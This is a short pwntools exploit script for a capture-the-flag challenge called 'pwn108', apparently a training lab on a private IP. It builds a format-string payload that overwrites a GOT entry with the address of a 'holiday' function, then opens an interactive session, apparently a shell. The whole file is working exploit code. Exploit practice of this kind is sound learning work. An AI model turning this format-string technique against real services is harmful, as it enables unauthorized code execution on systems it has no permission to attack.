#!/usr/bin/env python3
from pwn import *


context.update(arch="amd64", os="linux")

binary = ELF("./pwn108.pwn108")
#p = process("./pwn108.pwn108")
p = remote("10.10.40.136", 9008)

p.clean()
p.sendline(b'arun')

p.clean()
holiday = 4198971 # holiday address as integer

#fmt_str = b"%" + str(holiday).encode("utf-8") + b"s%6$lln" #%4198971s%6$lln
fmt_str = fmtstr_payload(10, {0x404018 : 4198971})
print(f"Format string: " + fmt_str.decode("utf-8"))

p.sendline(fmt_str)

p.interactive()
